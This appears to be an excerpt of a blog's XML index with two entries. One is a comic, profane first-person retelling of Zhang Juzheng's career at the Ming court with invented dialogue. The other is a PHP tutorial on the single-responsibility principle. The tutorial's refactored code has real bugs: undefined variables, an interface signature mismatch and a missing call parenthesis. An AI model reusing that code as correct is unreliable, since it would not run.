隆庆三年，赵贞吉入阁。他有才，又有一颗报国心。赵贞吉和我老师陈以勤是同乡，但是他是嘉靖十四年的进士，老师是二十六年的进士，这么说吧，内阁中都是他的后辈。 所以这位老小子，狂妄的很。 不知道用了手段，高拱也杀回来了。据传闻他是通过内监再次被起用的。这次高拱可是意气风发，不但入阁还兼掌吏部事。注意我的用词，兼掌，不是兼。 不说了，我得去拍马屁了。 “恭喜，恭喜！恭喜老哥重掌枢要，从此，国家又有了顶梁柱啦。” “老弟客气了，你也不赖呀。” “是吗？谢谢老哥夸奖，老哥是周公，我好比召公，我们共同辅佐圣明天子，好不好。” “好好！” 高拱这个愣头青的杀回，让赵贞吉很不舒服。隆庆四年，左都御史王廷致仕，赵贞吉和首辅李春芳说了，要兼掌都察院。老好人李春芳看热闹，不嫌事大。好，你要就给你。 一边是行政权，一边是检察权，旗鼓相当啊，针尖对麦芒，从此以后这两个人开始了无尽的撕逼 。 长江后浪推前浪，前浪死在沙滩上。赵贞吉最终还是败下阵来，但是他拼尽最后一口气，要求解除高拱见掌吏部的大权，以免私党建立。 在高拱和赵贞吉撕逼期间，俺答和自己的孙子，为了一个女人，爆发了家庭矛盾。我、宣大总督王崇古、大同巡抚方逢时化身正义的居委会大妈，成功地解决了他们的家庭矛盾。我大明朝和俺大之间决定搁置争议，共同开发边疆。 由于外交处理得好，王崇古升任太子少保、兵部尚书，宣大总督如故；方逢时升任兵部右侍郎兼右佥都御史。兵部尚书、侍郎连带我们大学士一概封赏。 这件事由于兵部尚书郭乾表现太差，没办法，没决断简直和首辅大人李春芳有一拼。高拱找了理由把他给免职了。高拱这时想到了一流军事专家杨博，可人家曾经当过吏部尚书，怎么愿意再回兵部呢？ 高拱就是高拱，杨博还是吏部尚书，高拱让他管理兵部事情，自己管理吏部事情。赵贞吉如果还在，肯定哭了。自己好不容易拉高拱下水，没想到人家虽然没名分，但有实。 徐阁老临走之前，将三位公子托付给我。 如今高拱再相，他可是有仇必报的人。李春芳老好人一个，想居中调停。可高拱是什么人，本来他就想上位首辅，结果还没找李春芳麻烦，李春芳自己却跳了出来。春芳既然不眷恋政权，为何要和你高拱斗，好！这年头，好人不好当。老子不干了，李春芳索性致仕。徐阁老的三位公子同时被抓，两位充军，田产也充公。徐阁老一再和我通信，我除了安慰老人家，别无他法，我可不敢得罪高拱。 虽然我不敢，但是有人敢。 高拱入阁以后，殷士儋想，陈以勤、高拱和我都是因为裕邸讲官的缘故入阁。他也在裕邸讲过学，轮也轮到自己入阁了。 可是高拱不打算提携殷士儋，他准备提携张四维。张四维性格恭顺，殷士儋倔强。好吧，既然你高拱不打算提携，殷士儋就自己想办法，你高拱通过内监入阁了，我殷士儋为何不能？ 终于殷士儋通过特旨入阁了。 从此两人水火不容。 高拱发动言官不断弹劾殷士儋，高拱部下第一大将都给事中韩揖还没有正式上疏，就扬言威胁了。终于殷士儋忍不住了，他不是徐阁老，没那么好的耐心。在一个适当的机会，任性了一把。 我朝的故事，每月初一、十五，给事中要到内阁和大学士见面，大家作一个揖，称为“会揖” ，原是一个沟通交流的机会。 这一次，都给事中韩揖到了，会揖后，殷士儋开门见山，“听说科长对我不满意啊，不满意不妨的，可犯不着给人利用呀。” 堂堂一个内阁大学士居然在内阁中说出这样的话，韩揖当时就懵逼了。高拱听出了指桑骂槐，过来说道：“这算什么体统！” 高拱一说话，事情就简单了，不成体统的体统多着呢！少保、武英殿大学士殷士儋撸起袖子，一手指着少师、建极殿大学士兼掌吏部尚书高拱，痛痛快快地骂了起来；“驱逐陈阁老的是你，驱逐赵阁老的是你，驱逐李阁老的是你，如今想要提拔张四维，又来驱逐我！内阁是你们家的吗？” 当时，少保的双拳离少师只有0.01公分，说时迟，那时快，我、少傅、建极殿大学士张居立即上去拉架。“你张居正也不是好东西，徐阁老对你可有知遇之恩，你个狼心狗肺的东西……” 我操！我就想，皇上要是也在文华殿该多好，不知道他看见少师、少傅、少保三个老头掐架，会不会笑呢？ 经过这一闹，殷士儋也没脸待下去，悄悄地走了，正如他轰轰烈烈地爱过，不，是闹过。 殷士儋走了，这回内阁就剩下我和高拱了，真的是周公、召公了。虽然我事事小心，但还是感到不安。我和高拱的位置太接近了。 在不断的政治战争中，皇上厌倦了，你们闹，我去静一静，他躲进了昭陵，从此不再出来。 7、登顶 大行皇帝离别之时，托孤高拱、我还有高仪。高仪是刚刚进入内阁的，还不到一个月，有些临危受命的赶脚。 大臣们在内阁痛哭，高拱更是嚎啕得不能自已，“十岁的太子，怎样治天下啊！”他觉得自己身上的担子更加重了。 这时，政治上崛起了一股新势力，冯保。冯保在世宗朝时就已经是司礼监秉笔太监了。穆宗一朝他多次想当掌印太监，可每次都有高拱的反对。这也难怪，高拱是靠着内监再次被起用的，他当然想用自己的人。 我朝的政治，本来充满弹性，司礼监的职权，没有明确的范围。名义上司礼监掌印太监是“掌理内外奏章及御前勘合”，秉笔太监是“掌章奏文书，照阁票批朱”。实际上他们的职权可以无限的扩大。掌理奏章是一个上下其手的机会，照阁票批朱是对于内阁票拟的谕旨，用朱笔加以最后的判断。这都是皇上的事情，后来皇上撂挑子，“批朱”的事情落在司礼监秉笔太监手上。虽然内阁大学士是皇上的私人秘书，但是秉笔太监成了皇上的机要秘书。这实际上真正的相权在太监手里。 现在冯保和高拱公开对立了，首先冯保利用皇后和皇贵妃的同情，驱逐了司礼监掌印太监孟冲，夺取了他的位置。 现在我们看看双方的阵容： 政治机构，司礼监vs内阁。 人员，冯保的身后有皇后、皇贵妃，尤其是皇贵妃，小皇帝只有十岁，当然和母亲站在一起了。高拱的身后有六科给事中和十三道监察御史。高拱是政治老斗士了，他战胜了好几位元老，当然看不上一个新进的掌印太监。他的身后有舆论和群众。亲密战友有高仪和我。高仪是高拱自己引进的，我当然不会背叛他了，我们是十几年的战友，我不说过他是周公，我是召公吗？ 高拱最痛恨的就是中旨了。中旨是皇上的手谕。诏令是要经过中书省，才能生效的。我朝废除中书省，诏令要经过内阁才是合法的。我朝在内阁以外，还有通政司和六科，对于皇上的手谕有随时复奏封驳之权，因此皇上颁发手谕也是受到拘束的。可是，法制归法制，事实是事实，一般情况下手谕还是不免出来。 冯保就是通过穆宗遗诏当上司礼监。当时，高拱气得直跺脚，对传旨太监骂道：“皇上年龄小的很，中旨是谁的旨意，你们这帮死太监，老子迟早把你们赶跑。” 传旨太监告诉了冯保，冯保懵逼了，这么嚣张？冯保哭哭啼啼的去皇贵妃那里告状，穆宗皇帝驾崩那天，高拱在内阁里吵吵，“十岁的孩子，怎样做皇帝啊！” “这是什么意思？”冯保稍微改造了一下高拱的句子，又恰到好处的提出了一个疑问句。“这是什么意思？”皇后、皇贵妃一下子紧张了起来，连小皇帝也变了脸色。 高拱当然也不能闲着，冯保是司礼监太监，他现在又利用中旨提督东厂了。司礼监掌印太监管宫内，东厂宫外，宫里宫外，冯保都能管，这还了得，他冯保成了实际的独裁者。高拱发动给事中、御史“嗖，嗖”的上疏弹劾冯保，一刻也不能闲。 内阁其他人呢？哦，高仪从入阁开始，就生病，一直在家养病。我忙着穆宗的葬事，没空啊。我不在北京。哎呦喂，各位看官，你们别闹，我不在北京，怎么对高拱和冯保的事情这么清楚。我……我……我后来听说的，毕竟事情闹得这么大，又有谁不知道。 穆宗葬事不可能一直忙吧？ 哎呦喂，我说各位看官，你们怎么这么多问题。 你们说天这么热，路途又这么辛苦，我中暑了，请假在家，难道不行吗。 隆庆六年六月十六日，天还没有亮。小皇帝召集大臣们到会极门。高拱去了，他满以为这次一定能赶走冯保。没想到，此时的冯保正站立在小皇帝旁边，两人对视着，“完了，全完了。”高拱瞬间瘫坐在地上。 冯保宣读了圣旨，让高拱滚出京城，马不停蹄地滚出去，一刻也不能停。 匆忙之间，高拱狼狈地逃出北京城，匆忙之间连一辆马车都找到，只好坐着牛车。 我们可以想象一下这画面：落魄的老人，不停地吆喝着大笨牛，大笨牛还死倔，不紧不慢地走着，偶尔，停下，翘起尾巴，拉泡屎，急的老头直冒汗，因为后面一群大兵在追逐。当时这可是件大新闻，轰动大江南北。 不管怎么样，周公走了，剩下我这个召公了。“周公为师，召公为保，相成王为左右，召公不悦。”高拱，你要多读《书》。 六月十九日，小皇帝召见我，这是我当上首辅以来，第一次召见。那时是辰刻，比往常的早朝，要晚一些。 他说，“先生为父皇陵寝，辛苦了。但国家事重，先生不要请假了，在内阁里调理吧。” 好的，老夫病好了，全好了，不必劳皇上费心。您看我还能后空翻呢。 小皇帝又询问了一下大政方针。 “遵守成宪”就是这么简单，我不是王安石，什么变法，什么改革的，我只知道祖宗旧制。祖宗旧制是什么？解释权在我！ 8、人事建设 当下最急需解决就是政治中枢。高拱走了，想要找到那样干练的吏部尚书是不可能的，但是现在有一位众望所归的大臣，管兵部的吏部尚书杨博。杨博子嘉靖三十四年以来，三任兵部尚书，嘉靖四十五年，调任吏部尚书，隆庆五年复又以吏部尚书起用，在资望方面没有比他在高的。 好了，杨博调回吏部，空下的兵部尚书呢？高拱曾经定下规矩，兵部侍郎出为总督，总督入为兵部尚书。现在有三位总督，前蓟辽总督谭纶，现任宣大总督王崇古，前任三边总督王之诰。我和杨博商量了一下，用谭纶比较好，然后我又给王崇古去信，说了一下情况，我朝刚与俺答贡市，还需要你的威望镇之。希望你不要介意没有推荐你来当兵部尚书。 正在我建设政治中枢的时候，高仪死了。嗯，他临危受命，现在内阁稳定了，他要去穆宗报告去了。 现在内阁就剩下我一个人了。论资望杨博肯定能入阁的，但是他已经是吏部尚书了。我朝故事，中枢二元制，吏部尚书地位本来在内阁大学士以上，自从世宗朝内阁权重以后，吏部尚书地位已不低于内阁。就是现在吏部尚书在路上遇见大学士也不避道。吏部尚书入阁的不是没有，高拱便是一个例子，但是那是特旨。廷推阁员的时候，通常都是选礼部尚书、礼部侍郎或者翰林学士等。好吧，我也有私心，就算杨博不是吏部尚书，我也不会选他的，我只需要一位忠厚老实的人，不需要雄才大略的重臣。为国家任贤选能固然重要，但是内阁安定更重要，隆庆年间的内阁窝里斗的事情刚刚过去不久。 所以我选了忠厚老实的礼部尚书吕调阳。 吕调阳空下的礼部尚书，我起用了陆树声。他是嘉靖二是年会试第一，曾掌南京翰林院，南京国子祭酒，后来召为吏部右侍郎，却称病不就，隆庆年间，再起故宫，仍不就。没想到这次他居然来了，我用后辈进见先辈之礼待遇他。 七月，户部尚书张守直，刑部尚书马自强致仕。张守直关于封贡一事，一直和我意见不和，马自强也对我有些微词。好了，他们走了。我补进王国光和王之诰。王国光原来就是以户部尚书，总督仓场，现在调回来管理部事。王之诰是我得亲家，隆庆三年总督陕西三边军务，后进南京兵部尚书，资望早就够了。 工部尚书朱衡、左都御史葛守礼留任，两人操守，才能都是众望所归。我虽然是首辅，但是内阁只是皇上的秘书机构，我当然没有任人的大权。但是合法手段行不通，不代表着不行，对于人选的布置，我可是费了好一番苦心，不管怎么说，最后的结果达到了我意愿。今后的用人，我都采用这个政策，想尽一切办法用那些我想用的人。 布置完各个枢要的人选，我还要应付三个更重要的人：皇贵妃；冯保；小皇帝。这三个都是我的主人，谁也不能得罪啊。 首先是要给皇后和皇贵妃上尊号。皇后当然尊为皇太后了，按理说李贵妃的地位要低一些，但是那样可以吗？不可以！绝对不可以，两位都是皇太后。两位都是皇太后，那称谓不容易混淆吗？没事儿，这都不叫事。我给皇后陈氏的尊号为仁圣皇太后，皇贵妃李氏的尊号为慈圣皇太后。 新皇登基，新气象啊，翰林院的燕子生了一窝白燕子，内阁的池塘开了一朵并蒂莲花，我忙进献给圣母，并写了祝词《白燕颂》、《白莲颂》。 不要说我拍马屁，阿谀奉承。目的达到了就行，皇上有手谕传来；“白燕、莲花俱进献圣母，甚是喜悦,却独产翰林院中,先开于密勿之地,上天正假此以见先生为社稷祥瑞,花中君子.朕赖先生启沃,固不敢颠纵,何德之有!” 李太后做功德，建涿州二桥，我写《敕建涿州二桥碑文》。 太后建承恩寺，我写碑文；太后建海会寺，我写碑文；太后建东岳庙，我写碑文，就这样说吧，太后做一件事，我就写篇文章拍马屁。 冯保不是一个安分守己的人呢，他的胡作非，我也有所耳闻，但是我不管，只要他不干政，做什么我都满足他。 冯保引用锦衣卫徐爵入宫，代阅奏章，拟诏旨；我就吩咐仆人游七和徐爵结为兄弟。 冯保要在故乡深州建牌坊，我就吩咐保定巡抚给他代建。 冯保自建生圹，我就给他写《冯公寿藏记》。 南京守备太监醉酒侮辱一个给事中，敢得罪言官，这下炸了窝。各路言官们争相恐后地弹劾那个守备太监。为了取悦冯保，我就把闹得最凶的给事中赵参鲁外放了，然后和冯保打了一下招呼，希望他能适当地约束一下手下。 为了让冯保有事情干，又有存在感，我就将一些礼仪性事务交给他处理，我只是希望他不要干政。 对待小皇帝，我不敢有丝毫怠慢，我亲自编写教材，亲自给他上课，洗脑要从娃娃开始。 9、开始 有人说我不行王道，只不过富国兴兵罢了。“呵呵，我何德何能，怎么富国兴兵了。” 国防是根本，帝国国防事业永远在第一位。 我开始了实行大臣巡边计划。 第一， 兵部左侍郎汪道昆巡视蓟、辽。 第二， 兵部右侍郎吴百朋巡视宣、大。 第三， 兵部侍郎协理京营戎政王麟巡视陕西四镇。 汪道昆和戚帅私交不错，又给戚帅去了信，一切顺利。 王麟对我有些微词，到了陕西办事办妥，便告病还乡。 吴百朋去宣大、山西的时候出了一些问题。王崇古怕吴百朋会干涉自己，吴百朋的朋友认为这是一种贬谪。别有办法，我只好双方去信解释。 吴百朋是有能力的，他去了以后，做出不少成绩，分别指出总督、巡抚个总兵的功过，奏请升黜。但是他严重地提出弹劾大同总兵马芳，认定了他行贿受贿。 好吧，行贿受贿，不用你调查我也知道，你是好样的，但是你没有考虑到我得处境。我苦口婆心地一番劝说，没有用，言官们认定了我包庇马芳，又把矛头对准了我。没办法，我只好把马芳免职了。 不能这样下去了，帝国需要一个有力地统治中心。 我的政令才能落实。我开始实行考成法。什么是考成法？就是述职报告，我要求官员写述职报告，述职报告写两份，一份交给各科，一份交给内阁。我根据述职报告来评定人员贤否。 六科控制六部，内阁控制六科，这是祖宗制度，我们都要遵守成宪。 什么？六科控制六部你们知道。内阁控制六科是什么时候制度？现在！ 考成法的颁布，行政效率提高了，国家的税收提高了。 我朝建国已久，各地土地兼并严重，税收根本收不上了。汉武帝年间，桑弘羊的武器是平准法，他打倒了富商大贾，把一切囤积居奇的利益归为国有。 我不是桑弘羊，没有汉武帝那样雄才大略的君主支持。当然我也不敢彻底地得罪名门望族。海瑞那个例子摆着呢。我只是利用考成法，要求地方官员按实收租而已，把往年收不上来的都收上来。 富国是兴兵的基础，当然要想富，不外乎开源节流。 考成法是开源，下面就是节流了。 元夕灯火，皇帝要大摆筵席。我劝说皇上免了吧，皇上是个听话的孩子，“好的。” 嗯，不错，给光禄寺省了700两银子。 “皇上您知道宋仁宗吗，他可是位明君。他不喜欢珠玉，爱贤臣。” “可是宫人们喜欢啊，朕需要赏赐她们呀。” “明君贵五谷而贱珠玉，五谷养人，珠玉饥不可食。” “那好，今后的赏赐我会节省的。” 内承运库太监崔敏上疏请买珠宝，疏发内阁，我瞥了一眼，不批！ 国家正有条不紊地走入正轨。这时却发生了一件不大不小的事。 《乾清宫里的不速之客》这份报纸风靡全城。事情很简单，也很蹊跷。一天皇上在乾清宫溜达，见一人神色匆匆，忙叫人拿下。 冯保是东厂的头子，这件事当然要交给他了。 他很高兴，终于有事情干了。他想起了高拱，想起高拱怎么对自己的。 于是这个路人——王大臣，有了刀，有了供词，主使人是高拱。高拱派王大臣刺杀天子。 从嘉靖二十七年夏言被杀以来，我朝多了一项传统。 严阁老当政，杀夏言。徐阁老当政，杀严世藩，80多岁的严嵩流落街头。高拱当政，徐阁老儿子充军，自己也朝不保夕。现在我当政了，高拱要遭殃了。 所有人都认为这件事，是我指使的。我…… 杨博和葛守礼这两个最有声望的大臣一起来拜见我，求我放过高拱，甚至用全家百口担保高拱的无辜。 我他妈的也生气了，我最敬佩的两个人也怀疑我。“两位是不是认定了这件事，是我指使的？” 杨博一看事不好，忙着改口，“不是的，只是这件事情，只有您才有回天之力。” “好吧，那这样行不行？我奏明皇上，东厂的只是初审。我建议复审此案。” 锦衣卫左都督朱希孝和左都御史葛守礼以及冯保负责此事。我选朱希孝是有原因的，我朝历来尊重靖难功臣。朱希孝是第二名靖难功臣朱能之后，第六代成国公朱希忠之弟。第一名靖难功臣淇国公丘福的后代被消除了，成国公是第一世家。用朱希孝复审众望所归。可是这倒把他给难住了，朱希孝遵照冯保的意见，得罪了士大夫，遵照良心吧，有得罪了冯保。 他回头又把皮球抛给我，让我出主意。我也不想得罪冯保啊，高拱死活关我什么事情，不对啊，他死了，好像我要背骂名啊。我找杨博、葛守礼商量怎么办，反正是你们带头揽的事情。 最后，不知道谁给王大臣灌下一杯生漆酒，成了哑巴，他不能诬陷高拱指使，也不能陈述冯保教唆，就这样糊里糊涂地交给了刑部，砍了头。王大臣的血洗清了高拱的冤，可是没有洗净我的嫌疑。到最后，时人还是认为这事情是我干的。操！ 万历元年，九月，杨博因病致仕。群臣廷推吏部尚书，候补人第一名，左都御史葛守礼，第二名，工部尚书朱衡，第三名，南京工部尚书张翰。葛守礼资望最高，朱衡治河有功，第三名一般都是分母，称为“陪推”，照例是不用的。 我推荐张瀚，张瀚呀，长得帅。 张瀚对于我，真是感激呀。 这时，礼部尚书陆树声因为对我有意见也要致仕，我托他弟弟劝他，没用！没办法，我只好亲自去他家里，可是这人一根筋，就是要致仕。好吧，那你给我推荐一个人，他推荐南京礼部侍郎万士和。 10、遵守成宪 接下来，我要干得是一件作死的事情——得罪读书人。历朝历代，得罪读书人的人，全没有好下场。当然，我不会觉得我是个例外，就算我现在的权威可以压制一切反对声，死后也会被清算的。既然走上这条不归路，我就风雨兼程，不会再想什么身后事了。 我朝的教育系统，两京的国子监是直接的国立大学，与地方无关。各府、州、县有府学、州学、县学，有一定的名额，归各省的提学官管辖。 太祖洪武年间规定，府学40人，州学30人，县学20人，日给廪膳，称为廪膳生员，廪膳每月领米一石，鱼肉油盐酱醋茶，也有官府提供。 宣德年间，规定府、州、县设增广生员，人数与廪膳生员相同。他们没有领米的权利，但是他们和廪膳生员一样，一家之内，出本人外，看可以免两个人的差役，换句话就是说一人读书，三人免役。以后又添附学生员，他们也有免役权利。这些生员，时人一般称为秀才。秀才们，有米可以领，免除劳役，文理通顺、有学问的可以考举人、进士，为国家做事。但是，大多秀才一辈子永远是秀才。秀才是地方上特权阶层，统治阶层的文官又出自他们，舆论又被他们控制着。他们可以压迫一般百姓，而百姓有没有机会和能力喊出反抗的声音。事实上，秀才常常就是当地领导阶层，就算不是，也会被领导阶层吸收，百姓们不但不会反对秀才，反而会拥护他们。 减少地方恶霸，为民众减轻负担，为公家平均劳役，就要整顿生员。 所以我指示地方学官，必须控制秀才质量，避免虚名不务实者混入；不许秀才干政，打倒游谈之士，不许私建书院；降低录取人数；确保通过考试的秀才能够被任用。 这都是老生常谈，这些政策不是没有颁布过，大多数不过一纸空文罢了。但是到我手里，就不一样了，因为我有考成法。因为考成法的关系，有司奉行非常严格，甚至出现了一州县仅录取一人的情况。 还有一个让我头疼的问题，就是驿站问题。驿站有主管人员，有马，有驴，有夫役，水驿有红船，有水夫，都很完备。这是一套完整的交通系统，可是马、驴从哪里来？船只哪里来？人力哪里来？都是民间，而且他们还要自备干粮。当然他们所做的这一切都无偿的，必须做的。实际上，交通干线附近的人民就成了国家的奴隶。 在太祖时代，非军国大事，不可以使用驿站。所以虽然有驿站制度，但是附近的百姓还可以忍受。 如今从最的六条已经发展到五十一条可以使用驿站的情况了。只有符合这五十一中的任何一条，都可以拿到证明使用驿站。那个证明称为勘合。 勘合分为五等：温良恭俭让。北京的勘合有兵部发出，各省的勘合由巡抚和巡按发出。填发的机关，还是有些限制的。可是实际填发的时候，就相当的“人性化”了。兵部可以发勘合送入，各省也可以发勘合送入，领用勘合的人没有限制归回日期。自己不用，还可以转给别人，名字不对，洗去，重新填。反正用勘合的人大多数不温良，也不恭俭，更谈不上让了，这五个字简直就是赤裸裸的讽刺啊。他们在驿站拼命的榨取百姓，要粮食，要柴炭，要酒席，要蔬菜，要鱼肉，要牲口，要人力。在交通干线的人民，真是处在水深火热之中。 所以我要恢复祖制，严格控制使用情况，而且使用后，必须归还勘合。 这些措施不是没有人实施过，不过都是一纸空文罢了。但是在我这儿，就不是了，因为我有考成法。 整顿驿站工作当然从自身做起，我儿子会江陵考试，我就让他自己花钱雇车。我父亲过生日，我就吩咐仆人背着寿礼骑驴回去。我弟弟病重回家乡养病，保定巡抚张卤送他勘合，我马上追缴回来。 甘肃巡抚侯东莱的儿子擅自使用驿站，言官弹劾他，虽然甘肃不是罪吃紧的地方，但是也在北方国防线，而且侯东莱很有能力，为了这件事，得罪一个封疆大吏。不管了，不能因为巡抚，坏了国法。我罢免他儿子的官。往后再想办法补偿他吧。 保定巡抚张卤一次上报十几个人，人数有些多。我就重点惩罚了太仆寺和太原府的官员。 没想到太原知府上书兵部和都察院，说他不是有意违法的，是山西巡抚派人护送他们外出公干，所以使用了外省驿站。 擦，居然把责任推到山西巡抚身上?山西可是国防要地，嗯，算了。我写信警告一下。 还有两种情况，我不好管。一个是内监，一个是衍圣公。内监的情况，我只好交给冯保了。衍圣公是孔圣人的后代，每年要入京朝贡。入京朝贡不好停止，不过每年都来，太频繁了。改成每三年来一次。 11、人性 湖广的官员说要给我在家乡建个牌坊。哎，建牌坊又费工又费料，一切的负担都得百姓承担，这样不好。他们说，没事，要不给大人折现吧。你们这帮孩子，让我怎么说你们？我们家的房子不太好，折现的钱不如给我修修房子吧。 都是孩子啊，理解能力不强。他们不仅给我建了牌坊，还修了房子。真拿他们没办法。不过他们没有动用老百姓，工人全是锦衣卫，这一点，我很欣慰。 有个知县给我送礼，我是拒绝的；他以为嫌少，又来了，我还是拒绝的；他第三次来的时候，居然还送来一条玉带，这种人好让人生气，我是清廉的，怎么会收礼？ 还有一个巡抚，名声不好，卸任以后，四处活动，想要再次被起用。不知道他哪里的消息居然找到我这儿来了，我只是皇上的秘书，哪有那么大的能力，我开玩笑地对他说，会和吏部提一下。这货居然当真了！ 我这么辛苦，为了谁？为了国家，为了天下苍生。可是有人不知好歹，居然告我。更可气是告诉我的人，居然是我的学生刘台。不行了，气死我了。我大明帝国二百年来，第一次有学生告老师的。 我混不下了，我请求致仕。 皇上降旨慰留，不行，我还是要请求致仕。 皇上再次下旨慰留，皇上还不放心，又派来司礼监太监孙隆前来慰留。 我再请求致仕，是不是太矫情了，算了。 皇上下旨打刘台100廷杖而后充军。 刘台毕竟是我的学生，他不懂事，是我教的不好，我去求求情吧。 皇上免了他廷杖，贬为庶民。 后来，有人揭发他在任时受贿，经调查属实，最后还是充军了。 妈的，这小子自己都不干净，沽名卖直之徒。 天有不测风云，人有旦夕祸福。这个消息对我来说，简直是晴天霹雳。我的父亲张文明去世了。我请求丁忧守制，安排父亲的丧事。 我朝的制度，在遇到承重祖父母、亲父母的丧事，守制二十七个月，期满起复。就是这二十七个月必须卸职回家，期满而后，照旧做官，称为“起复”。 皇上“夺情”。夺情就是二十七个月中，由皇上特别指定，不许卸职。 正在我考虑是否丁忧守制的时候。 户部侍郎李幼孜、冯保主张夺情。 北京御史、给事中要求夺情，南京御史、给事中也要求夺情。 形势一片大好，不对！是伤心，伤心不能为父亲丁忧守制。 这时，我的学生吴中行、赵用贤上疏要求我丁忧守制，接着刑部员外郎、我的老乡艾穆，、刑部主事沈思孝也上疏要求我丁忧守制。 从严阁老开始，敢攻击辅臣的，全是廷杖的惩罚。 杖、杖、杖，只有廷杖才能让他们老实。 当我匍匐在孝帷中的时候，礼部尚书马自强来了，翰林院的一大帮人来了。他们来给吴中行、赵用贤、艾穆、沈思孝四人求情。 “我在居丧之中，外面的事情，我不知道，也管不了。” “皇上很生气，要廷杖他们四人。” “皇上生气，我有什么办法？” “可是皇上是为了给您出气啊？” “刀，刀，我的刀呢？赶紧把我刀拿来！你们让我走，皇上让我留，我该怎么办？让我死了得了。” 我的学生、同乡居然攻击我。呵呵，想想，严阁老，他当国的时候，都没有同乡攻击他。我是不是对他们太好了，日了狗了。 七七之后，我入阁办事，不久之后有扫把星出现在天空。小人当道，嗯，肯定京城出现了坏人。皇上下旨考察京官，老虎不发威，你们真拿我当小猫咪了。这次，我好好的给你们这些人上上课，教给你们一个词语“党同伐异”。 最后我还是没有丁忧守制，不过我申请皇上停止我的俸禄，我要“停俸守制”，当然这个词是我发明的。 12、尾声 国家的政治中心在北京，国防第一线也在北方。这就需要南方的粮食源源不断的输送到北方来。我朝运粮，需要漕运，要想漕运，就得兴修水利。黄河是其中的重要一段，可是黄河经常因为泥沙问题，造成河道不通。 治理黄河好多年了，也不见成果。我决定起用潘季驯。关于治理黄河，有两种截然不同的方案。有人建议加宽河道，河道宽则水流畅。潘季驯则认为河道宽则流速小，则河沙沉底的几率越大，长年累月，河床就越积越。他主张，应该选择重要的地段把河道收紧，同时把附近的清水河流用人工疏凿引入黄河，以增加河水流速，这样可以不需要经常疏浚而“自浚”。 我没有亲自考察黄河，不过咨询了很多人，又看了些相关资料，去信给了意见，并表示，我没有亲自考察，又缺乏治河经验，那些意见仅供参考，你还是要坚持自己认为正确的方法。 我果然没有看错人，潘季驯成功了，实践证明他是正确的。 万历十年二月，浙江发生了兵变。事情是这样的，浙江巡抚吴善言奉召裁减东、西两营的粮饷，士兵哗变。以马文英、刘廷用为首，捉了巡抚痛打一顿。 我起用张佳胤为浙江巡抚平叛。张佳胤是高拱的人，但是个人才，我没有因为个人恩怨儿摒弃人才不用。 张佳胤赶去浙江的途中，又听说发生民变，“乱兵和乱民勾结了吗？” “还没有！” “赶快走，还来得及。” 张佳胤悄悄地入了杭州城，乱民四处烧杀抢掠，乱兵心绪惶惶，不知新来的巡抚如何处置他们。 张佳胤召来游击将军徐景星和东、西二营说，“要想将功赎罪，去把民变平定下来。” 这群乱兵一听这话，高兴极了，很快平定了民变，并送来一百五十个乱民，张佳胤下令杀掉三分之一，然后召马文英、刘廷用等人领赏。于是，这帮人来了，一共九个，上次兵变的首领，这次平乱的功臣，这时徐景星突然将他们全部逮捕，一刀一个。 顷刻之间，民变，兵变全部解决，我的眼光就是好。 正当大明朝蒸蒸日上的时候，我却病了，而且病得不轻。 病榻中，我想到徐阁老的生日快到了，我恳请吏部侍郎许国代拟寿序，序臣以后，我不满意，挣扎着亲自写了一篇；“居正尝谓，士君子所为尊主庇民，定经制，安社稷，有自以其身致之者，有不必身亲为之，而其道自行于天下，其泽自被于苍生者。窃以为此两者，惟吾师兼焉……”。 不知道，老师看到以后，会不会高兴。没错，徐阁老是我的恩师。 “尊主庇民，定经制，安社稷”老师亲身做到过；身后，托付给学生，我也做到了，这全是老师的功绩。 ​ 六月二十日，我知道自己不行了，但是我很欣慰，没有什么遗憾。国家蒸蒸日上，富国强兵指日可待，身后更无可担忧之事，皇上曾说过： “先生功大，朕无以为酬，只是看顾先生的子孙罢了。”]]></content>
      <tags>
        <tag>知乎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 代码段]]></title>
    <url>%2F2019%2F07%2F16%2Fphp-%E4%BB%A3%E7%A0%81%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[S.O.I.L.D 之单一职责123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&lt;?phpnamespace Acme\Reporting;use Auth;use DB;use Exception;class SalesReporter&#123; /** * 获取某个时间段的销售总额 * * @param $startDate * @param $endDate * * @return string */ public function between($startDate, $endDate) : string &#123; if (! Auth::check()) &#123; throw new Exception('Authentication required for reporting'); &#125; $sales = $this-&gt;queryDBForSalesBetween($startDate, $endDate); return $this-&gt;format($sales); &#125; /** * 查询销售报表数据 * * @param $startDate * @param $endDate * * @return float */ protected function queryDBForSalesBetween($startDate, $endDate) : float &#123; return DB::table('sales')-&gt;whereBetween('created_at', [$startDate, $endDate])-&gt;sum('charge') / 100; &#125; /** * 数据展示 * * @param $sales * @return string */ protected function format($sales) : string &#123; return "&lt;h1&gt;Sales: $sales&lt;/h1&gt;"; &#125;&#125;测试$report = new Acme\Reporting\SalesReporter();$report-&gt;between( now()-&gt;subDays(10), now());该例子明显违反了单一职责:授权方式发生变化时，如 API 授权，需要改动该类当数据库层发生变化时候，如使用 Redis 时，需要改动该类当展示方式发生变化时，需要改动该类正面示例对于上述的例子，应当作出如下的改动：不需要关心用户授权，用户授权与本类的职责无关数据层应当剥离出来展示层应当剥离出来&lt;?php// 展示层接口interface SalesOutputInterface &#123; public function output();&#125;// 展示层实现class HtmlOutput implements SalesOutputInterface &#123; public function output($sales) &#123; echo "&lt;h1&gt;&#123;$sales&#125;&lt;/h1&gt;"; &#125;&#125;// 数据层class SalesRepository &#123; public function between() &#123; return DB::table('sales')-&gt;whereBetween('create_at', [$startDate, $endDate])-&gt;sum('charge') / 100; &#125;&#125;// 职责类class SalsReporter &#123; public $repo; public function __construct($repo) &#123; $this-&gt;repo = $repo; &#125; public function between($startDate, $endDate, SalesOutputInterface $formater) &#123; $sales = $this-&gt;repo-&gt;between($startDate, $endDate); $formater-&gt;output($sales); &#125;&#125;测试$report = new SalsReporter(new SalesRepository);$report-&gt;between( now-&gt;subDays(10), now(), new HtmlOutput);结合 Laravel 的依赖注入，可以进一步简化https://learnku.com/articles/27923#topnavclass SalsReporter &#123; public $repo; public function __construct(SalesRepository $repo) &#123; $this-&gt;repo = $repo; &#125; public function between($startDate, $endDate, SalesOutputInterface $formater) &#123; $sales = $this-&gt;repo-&gt;between($startDate, $endDate); $formater-&gt;output($sales); &#125;&#125; 